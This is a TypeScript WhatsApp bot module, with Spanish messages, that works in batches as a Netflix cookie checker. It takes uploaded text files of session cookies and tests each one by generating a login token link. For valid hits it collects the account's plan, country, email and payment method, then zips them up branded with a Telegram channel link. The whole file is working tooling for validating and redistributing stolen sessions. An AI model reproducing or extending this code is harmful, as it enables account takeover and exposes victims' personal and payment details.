import { extractCookies, buildCookieString, generateToken, getMetadata } from './a.ts'

const batchSessions = new Map<string, Array<{ [key: string]: string }>>()

function getPlanType(planName: string): string {
  if (!planName) return 'Unknown'
  const p = planName.toLowerCase()
  if (p.includes('premium')) return 'Premium'
  if (p.includes('standard')) return 'Standard'
  if (p.includes('basic')) return 'Basic'
  if (p.includes('essential')) return 'Essential'
  if (p.includes('mobile')) return 'Mobile'
  return planName
}

function getCountryCode(meta: any): string {
  const cs = meta?.country_signup
  if (cs) {
    const str = String(cs).trim().toUpperCase()
    if (str.length <= 3 && /^[A-Z]+$/.test(str)) return str
    const letters = str.replace(/[^A-Z]/g, '')
    if (letters.length >= 2) return letters.slice(0, 2)
  }
  return 'XX'
}

function formatResultFile(cookieStr: string, link: string, meta: any): string {
  let content = `🍪 Netflix Cookie\n`
  content += `-----------------------------------------------------\n`
  content += `${cookieStr}\n`
  content += `-----------------------------------------------------\n`
  content += `🧃 Información de cookie\n\n`
  content += ` 🧨 Pais: ${meta?.country_signup || 'N/A'}\n\n`
  content += `🎋 Plan: ${meta?.plan || 'N/A'}\n`
  content += `🎐 Calidad: ${meta?.video_quality || 'N/A'}\n`
  content += `🎈 Próximo cobro: ${meta?.next_billing || 'N/A'}\n`
  content += `🧧 Miembro desde: ${meta?.member_since || 'N/A'}\n`
  if (meta?.email) content += `📧 Email: ${meta.email}\n`
  if (meta?.payment_method) content += `💳 Método de pago: ${meta.payment_method}\n`
  content += `\n-----------------------------------------------------\n`
  content += `🔥 Creado por HacheJota\n`
  content += `⭐️ Canal de tg: https://t.me/+6QTlv5t308owNjMx\n`
  content += `---------------------------------------------------\n`
  return content
}

function getProgressBar(current: number, total: number, length = 10): string {
  const percent = current / total
  const filled = Math.floor(length * percent)
  const bar = '▓'.repeat(filled) + '░'.repeat(length - filled)
  return `[${bar}] ${Math.floor(percent * 100)}%`
}

// ── Comando /nfbatch ─────────────────────────────────────
export default {
  command: ['nfbatch', 'check', 'go'],
  description: 'Modo lote: acumula archivos .txt y procesa todo con /go',
  category: 'tools',
  run: async (sock: any, m: any, { command, prefix }: any) => {
    const chatId: string = m.chat
    const cmd = command?.toLowerCase()

    if (cmd === 'nfbatch' || cmd === 'check') {
      batchSessions.set(chatId, [])
      await sock.sendMessage(m.chat, {
        text: `📥 *MODO BATCH ACTIVADO*\n\nEnvía los archivos *.txt* con cookies que quieras procesar.\nCuando termines, usa *${prefix}go* para iniciar la verificación.`,
      }, { quoted: m })
      await sock.sendMessage(m.chat, { react: { text: '📂', key: m.key } })
      return
    }

    if (cmd === 'go') {
      const session = batchSessions.get(chatId)

      if (!session) {
        await sock.sendMessage(m.chat, {
          text: `❌ Primero activa el modo batch con *${prefix}nfbatch*`,
        }, { quoted: m })
        return
      }

      if (!session.length) {
        await sock.sendMessage(m.chat, {
          text: `❌ No hay cookies acumuladas. Sube archivos *.txt* antes de usar *${prefix}go*`,
        }, { quoted: m })
        return
      }

      const total = session.length
      const statusMsg = await sock.sendMessage(m.chat, {
        text: `🔍 *Iniciando proceso batch...*\nTotal: *${total}* cookies`,
      }, { quoted: m })

      let successCount = 0
      let failedCount = 0
      const validResults: Array<{ cookieStr: string; link: string; meta: any }> = []

      for (let i = 0; i < session.length; i++) {
        if (i % 3 === 0 || i === total - 1) {
          const bar = getProgressBar(i, total)
          await sock.sendMessage(m.chat, {
            text: `⚡ *Verificando...*\n${bar}\nProcesados: ${i}/${total}\n✅ Hits: ${successCount} | ❌ Fails: ${failedCount}`,
            edit: statusMsg.key,
          })
        }

        const cd = session[i]
        const tokenResult = await generateToken(cd)

        if (tokenResult.ok && tokenResult.token) {
          successCount++
          const meta = await getMetadata(cd)
          validResults.push({
            cookieStr: buildCookieString(cd),
            link: `https://netflix.com/?nftoken=${tokenResult.token}`,
            meta,
          })
        } else {
          failedCount++
        }

        if (i % 5 === 0) await new Promise(r => setTimeout(r, 300))
      }

      batchSessions.delete(chatId)

      await sock.sendMessage(m.chat, {
        text: `✅ *PROCESO COMPLETADO*\n\n├ 📊 Total: \`${total}\`\n├ ✨ Hits: \`${successCount}\`\n└ 💀 Fails: \`${failedCount}\``,
        edit: statusMsg.key,
      })

      if (!validResults.length) {
        await sock.sendMessage(m.chat, { text: '💀 No hubo cookies válidas.' }, { quoted: m })
        await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
        return
      }

      const JSZip = require('jszip')
      const zip = new JSZip()

      validResults.forEach((r, idx) => {
        const plan = getPlanType(r.meta?.plan)
        const country = getCountryCode(r.meta)
        const filename = `[${plan}] [${country}] [${String(idx + 1).padStart(4, '0')}] Netflix.txt`
        zip.file(filename, formatResultFile(r.cookieStr, r.link, r.meta))
      })

      const zipBuffer: Buffer = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' })
      const timestamp = new Date().toISOString().replace(/[:.]/g, '').slice(0, 15)

      await sock.sendMessage(m.chat, {
        document: zipBuffer,
        fileName: `Netflix_Batch_${timestamp}.zip`,
        mimetype: 'application/zip',
        caption: `📦 *Resultado Batch*\n${successCount} cuentas válidas con metadata.\n\nFormato: \`[Plan] [PAIS] [XXXX] Netflix.txt\``,
      }, { quoted: m })

      await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
      return
    }

    const session = batchSessions.get(chatId)
    if (!session) return

    const msg = m.message
    const hasDocument =
      msg?.documentMessage ||
      msg?.documentWithCaptionMessage?.message?.documentMessage

    if (!hasDocument) return

    await sock.sendMessage(m.chat, { react: { text: '📥', key: m.key } })

    let fileBuffer: Buffer
    try {
      const stream = await sock.downloadMediaMessage(m)
      const chunks: Buffer[] = []
      for await (const chunk of stream) chunks.push(chunk)
      fileBuffer = Buffer.concat(chunks)
    } catch {
      await sock.sendMessage(m.chat, { text: '❌ No pude descargar el archivo.' }, { quoted: m })
      return
    }

    const content = fileBuffer.toString('utf-8')
    const extracted = extractCookies(content)

    if (!extracted.length) {
      await sock.sendMessage(m.chat, {
        text: '⚠️ No se encontraron cookies en ese archivo.',
      }, { quoted: m })
      return
    }

    session.push(...extracted)
    batchSessions.set(chatId, session)

    const docName =
      msg?.documentMessage?.fileName ||
      msg?.documentWithCaptionMessage?.message?.documentMessage?.fileName ||
      'archivo.txt'

    await sock.sendMessage(m.chat, {
      text: `✅ *Archivo añadido*\n\n├ 📁 \`${docName}\`\n├ 📥 Cookies añadidas: \`${extracted.length}\`\n└ 💾 Total acumulado: \`${session.length}\`\n\n_Envía más archivos o usa *${prefix}go*_`,
    }, { quoted: m })
  },
}
